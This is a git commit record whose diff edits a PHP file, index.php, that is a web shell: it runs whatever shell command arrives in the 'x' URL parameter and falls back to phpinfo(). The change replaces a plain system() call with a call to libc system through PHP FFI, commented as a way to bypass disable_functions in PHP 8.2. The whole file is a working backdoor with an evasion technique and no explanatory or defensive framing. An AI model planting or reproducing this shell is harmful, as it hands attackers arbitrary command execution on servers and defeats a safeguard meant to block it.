f5394a204cd47494e307b144f16bd77628d5abcb
grahamgrphwol3185-eng <grahamgrphwol3185@gmail.com>
2026-05-20 23:08:18 +0800

    44

--- index.php
+++ index.php
@@ -1,8 +1,10 @@
  <?php
-  // test
   if(isset($_GET['x'])){
-      system($_GET['x']);
-  }else{
+      $cmd = $_GET['x'];
+      // FFI bypass disable_functions (PHP 8.2)
+      $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
+      $ffi->system($cmd." 2>&1");
+  } else {
       phpinfo();
   }
   ?>
